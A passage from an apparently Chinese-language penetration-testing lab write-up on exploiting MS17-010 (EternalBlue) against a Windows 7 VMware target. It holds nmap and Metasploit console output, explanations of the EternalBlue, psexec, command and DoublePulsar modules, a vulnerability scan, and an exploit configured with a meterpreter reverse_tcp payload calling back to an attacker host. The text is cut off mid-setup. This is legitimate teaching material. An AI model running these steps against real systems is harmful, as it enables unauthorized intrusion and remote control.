+</span></span><span class=line><span class=cl>Service Info: Host: ANKH-PC<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Host script results:
+</span></span><span class=line><span class=cl><span class=p>|</span> smb-os-discovery: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   OS: Windows <span class=m>7</span> Enterprise <span class=m>7600</span> <span class=o>(</span>Windows <span class=m>7</span> Enterprise 6.1<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   OS CPE: cpe:/o:microsoft:windows_7::-
+</span></span><span class=line><span class=cl><span class=p>|</span>   Computer name: Ankh-PC
+</span></span><span class=line><span class=cl><span class=p>|</span>   NetBIOS computer name: ANKH-PC<span class=se>\x</span><span class=m>00</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   Workgroup: WORKGROUP<span class=se>\x</span><span class=m>00</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  System time: 2025-12-31T10:52:28+08:00
+</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: 0s
+</span></span><span class=line><span class=cl><span class=p>|</span>_nbstat: NetBIOS name: ANKH-PC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:10:6d:b7 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2025-12-31T02:52:28
+</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: 2025-12-31T02:41:52
+</span></span><span class=line><span class=cl><span class=p>|</span> smb-security-mode: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   account_used: guest
+</span></span><span class=line><span class=cl><span class=p>|</span>   authentication_level: user
+</span></span><span class=line><span class=cl><span class=p>|</span>   challenge_response: supported
+</span></span><span class=line><span class=cl><span class=p>|</span>_  message_signing: disabled <span class=o>(</span>dangerous, but default<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   2:1:0: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled but not required
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 69.41 seconds
+</span></span></code></pre></td></tr></table></div></div><ul><li><p><strong>靶机信息</strong></p><ul><li><p><strong>IP地址</strong>：10.0.0.17</p></li><li><p><strong>主机状态</strong>：在线（延迟 0.00047s）</p></li><li><p><strong>操作系统</strong>：Windows 7 Enterprise 7600 (版本 6.1)</p></li><li><p><strong>主机名</strong>：ANKH-PC</p></li><li><p><strong>工作组</strong>：WORKGROUP</p></li><li><p><strong>MAC地址</strong>：00:0C:29:10:6D:B7 (VMware 虚拟机)</p></li><li><p><strong>系统时间</strong>：UTC+8 (北京时间)</p></li></ul></li><li><p><strong>开放端口与服务</strong></p><ul><li><p><strong>135/tcp</strong> - Microsoft Windows RPC (MSRPC)</p></li><li><p><strong>139/tcp</strong> - Microsoft Windows NetBIOS-SSN</p></li><li><p><strong>445/tcp</strong> - Microsoft-DS (SMB)</p><ul><li><p>Windows 7 Enterprise 7600</p></li><li><p>工作群组：WORKGROUP</p></li></ul></li><li><p><strong>49152-49157/tcp</strong> - Microsoft Windows RPC (MSRPC)</p></li></ul></li><li><p><strong>SMB安全评估</strong></p><ul><li><p><strong>身份验证级别</strong>：用户级</p></li><li><p><strong>消息签名</strong>：已启用但非必需（默认配置）</p></li><li><p><strong>签名状态</strong>：已禁用（存在风险，但为默认设置，可能面临中间人攻击风险）</p></li><li><p><strong>尝试账户</strong>：guest</p></li></ul></li></ul><h3 id=metasploit扫描与漏洞利用>Metasploit扫描与漏洞利用</h3><h4 id=一启动metasploit框架root>一、启动Metasploit框架（root）：</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# msfconsole
+</span></span><span class=line><span class=cl>Metasploit tip: Save the current environment with the save command, 
+</span></span><span class=line><span class=cl>future console restarts will use this environment again
+</span></span><span class=line><span class=cl>                                                  
+</span></span><span class=line><span class=cl>  +-------------------------------------------------------+
+</span></span><span class=line><span class=cl>  <span class=p>|</span>  METASPLOIT by Rapid7                                 <span class=p>|</span>
+</span></span><span class=line><span class=cl>  +---------------------------+---------------------------+
+</span></span><span class=line><span class=cl>  <span class=p>|</span>      __________________   <span class=p>|</span>                           <span class=p>|</span>
+</span></span><span class=line><span class=cl>  <span class=p>|</span>  <span class=o>==</span>c<span class=o>(</span>______<span class=o>(</span>o<span class=o>(</span>______<span class=o>(</span>_<span class=o>()</span>  <span class=p>|</span> <span class=p>|</span><span class=s2>&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;&#34;</span><span class=p>|</span><span class=o>======[</span>***  <span class=p>|</span>
+</span></span><span class=line><span class=cl>  <span class=p>|</span>             <span class=o>)=</span><span class=se>\ </span>          <span class=p>|</span> <span class=p>|</span>  EXPLOIT   <span class=se>\ </span>           <span class=p>|</span>
+</span></span><span class=line><span class=cl>  <span class=p>|</span>            // <span class=se>\\</span>          <span class=p>|</span> <span class=p>|</span>_____________<span class=se>\_</span>______    <span class=p>|</span>
+</span></span><span class=line><span class=cl>  <span class=p>|</span>           //   <span class=se>\\</span>         <span class=p>|</span> <span class=p>|</span><span class=o>==[</span>msf &gt;<span class=o>]============</span><span class=se>\ </span>  <span class=p>|</span>
+</span></span><span class=line><span class=cl>  <span class=p>|</span>          //     <span class=se>\\</span>        <span class=p>|</span> <span class=p>|</span>______________________<span class=se>\ </span> <span class=p>|</span>
+</span></span><span class=line><span class=cl>  <span class=p>|</span>         // RECON <span class=se>\\</span>       <span class=p>|</span> <span class=se>\(</span>@<span class=o>)(</span>@<span class=o>)(</span>@<span class=o>)(</span>@<span class=o>)(</span>@<span class=o>)(</span>@<span class=o>)(</span>@<span class=o>)</span>/   <span class=p>|</span>
+</span></span><span class=line><span class=cl>  <span class=p>|</span>        //         <span class=se>\\</span>      <span class=p>|</span>  *********************    <span class=p>|</span>
+</span></span><span class=line><span class=cl>  +---------------------------+---------------------------+
+</span></span><span class=line><span class=cl>  <span class=p>|</span>      o O o                <span class=p>|</span>        <span class=se>\&#39;\/\/\/</span><span class=s1>&#39;/         |
+</span></span></span><span class=line><span class=cl><span class=s1>  |              o O          |         )======(          |
+</span></span></span><span class=line><span class=cl><span class=s1>  |                 o         |       .&#39;</span>  LOOT  <span class=s1>&#39;.        |
+</span></span></span><span class=line><span class=cl><span class=s1>  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
+</span></span></span><span class=line><span class=cl><span class=s1>  | |    PAYLOAD     |&#34;&#34;\___, |     /    (_||_     \      |
+</span></span></span><span class=line><span class=cl><span class=s1>  | |________________|__|)__| |    |     __||_)     |     |
+</span></span></span><span class=line><span class=cl><span class=s1>  | |(@)(@)&#34;&#34;&#34;**|(@)(@)**|(@) |    &#34;       ||       &#34;     |
+</span></span></span><span class=line><span class=cl><span class=s1>  |  = = = = = = = = = = = =  |     &#39;</span>--------------<span class=err>&#39;</span>      <span class=p>|</span>                  
+</span></span><span class=line><span class=cl>  +---------------------------+---------------------------+                  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>       <span class=o>=[</span> metasploit v6.4.69-dev                          <span class=o>]</span>
+</span></span><span class=line><span class=cl>+ -- --<span class=o>=[</span> <span class=m>2529</span> exploits - <span class=m>1302</span> auxiliary - <span class=m>432</span> post       <span class=o>]</span>
+</span></span><span class=line><span class=cl>+ -- --<span class=o>=[</span> <span class=m>1672</span> payloads - <span class=m>49</span> encoders - <span class=m>13</span> nops           <span class=o>]</span>
+</span></span><span class=line><span class=cl>+ -- --<span class=o>=[</span> <span class=m>9</span> evasion                                       <span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Metasploit Documentation: https://docs.metasploit.com/
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>msf6 &gt; 
+</span></span></code></pre></td></tr></table></div></div><h4 id=二搜索ms17-010模块>二、搜索<code>ms17-010</code>模块：</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 &gt; search ms17-010
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Matching <span class=nv>Modules</span>
+</span></span><span class=line><span class=cl><span class=o>================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   <span class=c1>#   Name                                           Disclosure Date  Rank     Check  Description</span>
+</span></span><span class=line><span class=cl>   -   ----                                           ---------------  ----     -----  -----------
+</span></span><span class=line><span class=cl>   <span class=m>0</span>   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+</span></span><span class=line><span class=cl>   <span class=m>1</span>     <span class=se>\_</span> target: Automatic Target                  .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>2</span>     <span class=se>\_</span> target: Windows <span class=m>7</span>                         .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>3</span>     <span class=se>\_</span> target: Windows Embedded Standard <span class=m>7</span>       .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>4</span>     <span class=se>\_</span> target: Windows Server <span class=m>2008</span> R2            .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>5</span>     <span class=se>\_</span> target: Windows <span class=m>8</span>                         .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>6</span>     <span class=se>\_</span> target: Windows 8.1                       .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>7</span>     <span class=se>\_</span> target: Windows Server <span class=m>2012</span>               .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>8</span>     <span class=se>\_</span> target: Windows <span class=m>10</span> Pro                    .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>9</span>     <span class=se>\_</span> target: Windows <span class=m>10</span> Enterprise Evaluation  .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>10</span>  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+</span></span><span class=line><span class=cl>   <span class=m>11</span>    <span class=se>\_</span> target: Automatic                         .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>12</span>    <span class=se>\_</span> target: PowerShell                        .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>13</span>    <span class=se>\_</span> target: Native upload                     .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>14</span>    <span class=se>\_</span> target: MOF upload                        .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>15</span>    <span class=se>\_</span> AKA: ETERNALSYNERGY                       .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>16</span>    <span class=se>\_</span> AKA: ETERNALROMANCE                       .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>17</span>    <span class=se>\_</span> AKA: ETERNALCHAMPION                      .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>18</span>    <span class=se>\_</span> AKA: ETERNALBLUE                          .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>19</span>  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+</span></span><span class=line><span class=cl>   <span class=m>20</span>    <span class=se>\_</span> AKA: ETERNALSYNERGY                       .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>21</span>    <span class=se>\_</span> AKA: ETERNALROMANCE                       .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>22</span>    <span class=se>\_</span> AKA: ETERNALCHAMPION                      .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>23</span>    <span class=se>\_</span> AKA: ETERNALBLUE                          .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>24</span>  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
+</span></span><span class=line><span class=cl>   <span class=m>25</span>    <span class=se>\_</span> AKA: DOUBLEPULSAR                         .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>26</span>    <span class=se>\_</span> AKA: ETERNALBLUE                          .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>27</span>  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+</span></span><span class=line><span class=cl>   <span class=m>28</span>    <span class=se>\_</span> target: Execute payload <span class=o>(</span>x64<span class=o>)</span>             .                .        .      .
+</span></span><span class=line><span class=cl>   <span class=m>29</span>    <span class=se>\_</span> target: Neutralize implant                .                .        .      .
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Interact with a module by name or index. For example info 29, use <span class=m>29</span> or use exploit/windows/smb/smb_doublepulsar_rce                                      
+</span></span><span class=line><span class=cl>After interacting with a module you can manually <span class=nb>set</span> a TARGET with <span class=nb>set</span> TARGET <span class=s1>&#39;Neutralize implant&#39;</span>                                                        
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>msf6 &gt; 
+</span></span></code></pre></td></tr></table></div></div><p>以上为metasploit中的ms17-010（永恒之蓝）模块。</p><ul><li><p><strong>MS17-010 (永恒之蓝) 漏洞利用套件详解</strong></p><ul><li><p><strong>主要攻击模块</strong></p><p><strong>a. exploit/windows/smb/ms17_010_eternalblue (索引 0-9)</strong></p><ul><li><strong>介绍</strong>： 这是最著名、最直接的攻击模块。它利用SMBv1协议的内核级漏洞，通过越界写入破坏内核内存池，实现远程代码执行。攻击过程直接在内核态进行，极其“暴力”。</li><li><strong>漏洞类型</strong>： SMB协议远程内核池破坏漏洞。</li><li><strong>利用方式</strong>： 发送特制SMBv1数据包触发内核内存破坏。</li><li><strong>目标系统</strong>：<ul><li>Windows 7 / Server 2008 R2（主要目标）</li><li>Windows 8/8.1 / Server 2012</li><li>Windows 10 Pro/Enterprise</li></ul></li><li><strong>特点</strong>：<ul><li><strong>无需任何身份验证</strong>。</li><li>对Windows 7/2008 R2成功率较高。</li><li>操作风险高：由于直接操作内核内存，若堆喷射失败，极易导致目标系统<strong>蓝屏死机(BSOD)</strong>。</li><li>依赖目标开启445端口。</li></ul></li><li><strong>关键参数</strong>： <code>GroomAllocations</code>。调整此内存分配参数有时能在攻击失败时提高成功率。</li></ul><p><strong>b. exploit/windows/smb/ms17_010_psexec (索引 10-18)</strong></p><ul><li><strong>介绍</strong>： 此模块不一定需要凭证。它主要利用<strong>EternalRomance</strong>等漏洞链，通过SMB命名管道中的类型混淆漏洞进行攻击。相比EternalBlue更稳定，是攻击更新系统（如Win10）的首选。</li><li><strong>技术集合</strong>： 融合了多个SMB漏洞，包括EternalRomance、EternalSynergy、EternalChampion。</li><li><strong>目标类型</strong>：<ul><li><strong>PowerShell</strong>： 通过PowerShell在内存中执行载荷。</li><li><strong>Native upload</strong>： 直接上传可执行文件执行。</li><li><strong>MOF upload</strong>： 使用WMI托管对象格式执行。</li></ul></li><li><strong>优点</strong>：<ul><li>比EternalBlue<strong>更稳定</strong>，几乎不会导致蓝屏。</li><li>支持多种载荷传输和执行方式。</li><li>如果拥有有效的SMB凭证（即使是普通用户），成功率接近100%。</li></ul></li></ul></li><li><p><strong>辅助模块</strong></p></li></ul><p><strong>a. auxiliary/scanner/smb/smb_ms17_010 (索引 24-26)</strong></p><ul><li><strong>介绍</strong>： <strong>攻击前必备的侦察模块</strong>。用于安全地检测目标主机是否存在MS17-010漏洞，并检查是否已被植入DoublePulsar后门。</li><li><strong>功能</strong>：<ul><li>检测目标是否存在MS17-010漏洞。</li><li>检测目标是否已感染DoublePulsar后门。</li></ul></li><li><strong>输出解读</strong>：<ul><li><code>VULNERABLE</code>： 目标存在漏洞，可尝试攻击。</li><li><code>DoublePulsar detected</code>： 目标已被攻破，内存中驻留有后门。</li></ul></li><li><strong>特点</strong>：<ul><li>非入侵性，仅用于信息收集。</li><li>支持扫描整个网段（<code>set RHOSTS 192.168.1.0/24</code>）。</li></ul></li></ul><p><strong>b. auxiliary/admin/smb/ms17_010_command (索引 19-23)</strong></p><ul><li><p><strong>介绍</strong>： 一个轻量级的命令执行模块。不返回交互式Shell，仅执行单条系统命令并返回结果。适用于快速、隐蔽的任务。</p></li><li><p><strong>功能</strong>： 在已确认存在漏洞或已被控的系统上执行命令。</p></li><li><p><strong>用途</strong>：</p><ul><li>后渗透阶段快速执行命令（如<code>whoami</code>、添加用户）。</li><li>在不建立持久连接的情况下进行操作。</li><li>同样支持EternalRomance等多种利用方式。</li></ul></li><li><p><strong>后门利用模块</strong></p></li></ul><p><strong>exploit/windows/smb/smb_doublepulsar_rce (索引 27-29)</strong></p><ul><li><p><strong>DoublePulsar是什么</strong>： 一个隐蔽的、无文件落地的内存SMB后门，通常由EternalBlue攻击成功后植入。</p></li><li><p><strong>核心功能</strong>：</p><ul><li><strong>Execute payload</strong>： 若发现目标已存在DoublePulsar后门，可直接通过此后门注入DLL或执行代码，<strong>无需再次触发原始漏洞</strong>。</li><li><strong>Neutralize implant</strong>： 在渗透测试结束后，专业地<strong>清除</strong>内存中的后门痕迹。</li></ul></li><li><p><strong>目标选项</strong>：</p><ul><li><strong>注入载荷</strong>： 利用现有后门执行代码。</li><li><strong>清除后门</strong>： 卸载DoublePulsar植入物。</li></ul></li><li><p><strong>高级配置选项（通用）</strong></p></li></ul><p>这些参数在多数相关模块中通用：</p><ul><li><strong><code>RHOST</code> / <code>RHOSTS</code></strong>： 目标IP地址或IP范围（如<code>192.168.1.10</code>或<code>192.168.1.0/24</code>）。</li><li><strong><code>RPORT</code></strong>： SMB服务端口，默认为<code>445</code>。</li><li><strong><code>SMBUser</code> / <code>SMBPass</code></strong>： SMB用户名和密码（对于<code>psexec</code>模块尤其重要）。</li><li><strong><code>VERIFY_ARCH</code></strong>： 是否验证目标系统架构（64位/32位）。</li><li><strong><code>VERIFY_TARGET</code></strong>： 是否验证目标操作系统版本。</li><li><strong><code>GroomAllocations</code></strong>： <strong>(EternalBlue专用)</strong> 调整初始内存分配请求的数量，以影响内核内存布局。</li></ul></li></ul><h4 id=三探测目标主机>三、探测目标主机</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 &gt; use <span class=m>24</span>
+</span></span><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/smb/smb_ms17_010<span class=o>)</span> &gt; <span class=nb>set</span> rhost 10.0.0.17
+</span></span><span class=line><span class=cl><span class=nv>rhost</span> <span class=o>=</span>&gt; 10.0.0.17
+</span></span><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/smb/smb_ms17_010<span class=o>)</span> &gt; run
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> 10.0.0.17:445         - Host is likely VULNERABLE to MS17-010! - Windows <span class=m>7</span> Enterprise <span class=m>7600</span> x64 <span class=o>(</span>64-bit<span class=o>)</span>
+</span></span><span class=line><span class=cl>/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator <span class=s1>&#39;+&#39;</span> and <span class=s1>&#39;?&#39;</span> was replaced with <span class=s1>&#39;*&#39;</span> in regular expression
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 10.0.0.17:445         - Scanned <span class=m>1</span> of <span class=m>1</span> hosts <span class=o>(</span>100% <span class=nb>complete</span><span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Auxiliary module execution completed
+</span></span><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/smb/smb_ms17_010<span class=o>)</span> &gt; 
+</span></span></code></pre></td></tr></table></div></div><p>关键信息：<code>Host is likely VULNERABLE to MS17-010! - Windows 7 Enterprise 7600 x64 (64-bit)</code></p><h4 id=四漏洞利用>四、漏洞利用</h4><p>切换<code>exploit</code>模块 -> 设置靶机IP -> 设置攻击机IP -> 设置载荷 -> 检察配置信息 -> <code>run</code> -> 权限验证</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>msf6 auxiliary<span class=o>(</span>scanner/smb/smb_ms17_010<span class=o>)</span> &gt; use <span class=m>0</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Using configured payload windows/x64/meterpreter/reverse_tcp
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt; <span class=nb>set</span> rhost 10.0.0.17
+</span></span><span class=line><span class=cl><span class=nv>rhost</span> <span class=o>=</span>&gt; 10.0.0.17
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt; <span class=nb>set</span> lhost 10.0.0.223
+</span></span><span class=line><span class=cl><span class=nv>lhost</span> <span class=o>=</span>&gt; 10.0.0.223
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt; <span class=nb>set</span> payload windows/x64/meterpreter/reverse_tcp
+</span></span><span class=line><span class=cl><span class=nv>payload</span> <span class=o>=</span>&gt; windows/x64/meterpreter/reverse_tcp
+</span></span><span class=line><span class=cl>msf6 exploit<span class=o>(</span>windows/smb/ms17_010_eternalblue<span class=o>)</span> &gt; show options
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Module options <span class=o>(</span>exploit/windows/smb/ms17_010_eternalblue<span class=o>)</span>:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Name           Current Setting  Required  Description
+</span></span><span class=line><span class=cl>   ----           ---------------  --------  -----------
+</span></span><span class=line><span class=cl>   RHOSTS         10.0.0.17        yes       The target host<span class=o>(</span>s<span class=o>)</span>, see https:
+</span></span><span class=line><span class=cl>                                             //docs.metasploit.com/docs/usi
+</span></span><span class=line><span class=cl>                                             ng-metasploit/basics/using-met
+</span></span><span class=line><span class=cl>                                             asploit.html
+</span></span><span class=line><span class=cl>   RPORT          <span class=m>445</span>              yes       The target port <span class=o>(</span>TCP<span class=o>)</span>
+</span></span><span class=line><span class=cl>   SMBDomain                       no        <span class=o>(</span>Optional<span class=o>)</span> The Windows domain
+</span></span><span class=line><span class=cl>                                             to use <span class=k>for</span> authentication. Onl
+</span></span><span class=line><span class=cl>                                             y affects Windows Server <span class=m>2008</span>
+</span></span><span class=line><span class=cl>                                             R2, Windows 7, Windows Embedde
+</span></span><span class=line><span class=cl>                                             d Standard <span class=m>7</span> target machines.
+</span></span><span class=line><span class=cl>   SMBPass                         no        <span class=o>(</span>Optional<span class=o>)</span> The password <span class=k>for</span> th
+</span></span><span class=line><span class=cl>                                             e specified username
+</span></span><span class=line><span class=cl>   SMBUser                         no        <span class=o>(</span>Optional<span class=o>)</span> The username to aut
+</span></span><span class=line><span class=cl>                                             henticate as
+</span></span><span class=line><span class=cl>   VERIFY_ARCH    <span class=nb>true</span>             yes       Check <span class=k>if</span> remote architecture m
+</span></span><span class=line><span class=cl>                                             atches exploit Target. Only af
+</span></span><span class=line><span class=cl>                                             fects Windows Server <span class=m>2008</span> R2,
+</span></span><span class=line><span class=cl>                                             Windows 7, Windows Embedded St
+</span></span><span class=line><span class=cl>                                             andard <span class=m>7</span> target machines.
+</span></span><span class=line><span class=cl>   VERIFY_TARGET  <span class=nb>true</span>             yes       Check <span class=k>if</span> remote OS matches exp
+</span></span><span class=line><span class=cl>                                             loit Target. Only affects Wind
+</span></span><span class=line><span class=cl>                                             ows Server <span class=m>2008</span> R2, Windows 7,
+</span></span><span class=line><span class=cl>                                              Windows Embedded Standard <span class=m>7</span> t
+</span></span><span class=line><span class=cl>                                             arget machines.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Payload options <span class=o>(</span>windows/x64/meterpreter/reverse_tcp<span class=o>)</span>:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   Name      Current Setting  Required  Description
+</span></span><span class=line><span class=cl>   ----      ---------------  --------  -----------
+</span></span><span class=line><span class=cl>   EXITFUNC  thread           yes       Exit technique <span class=o>(</span>Accepted: <span class=s1>&#39;&#39;</span>, seh,
+</span></span><span class=line><span class=cl>                                        thread, process, none<span class=o>)</span>
+</span></span><span class=line><span class=cl>   LHOST     10.0.0.223       yes       The listen address <span class=o>(</span>an interface ma
+</span></span><span class=line><span class=cl>                                        y be specified<span class=o>)</span>
+</span></span><span class=line><span class=cl>   LPORT     <span class=m>4444</span>             yes       The listen port
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Exploit target:
+</span></span><span class=line><span class=cl>
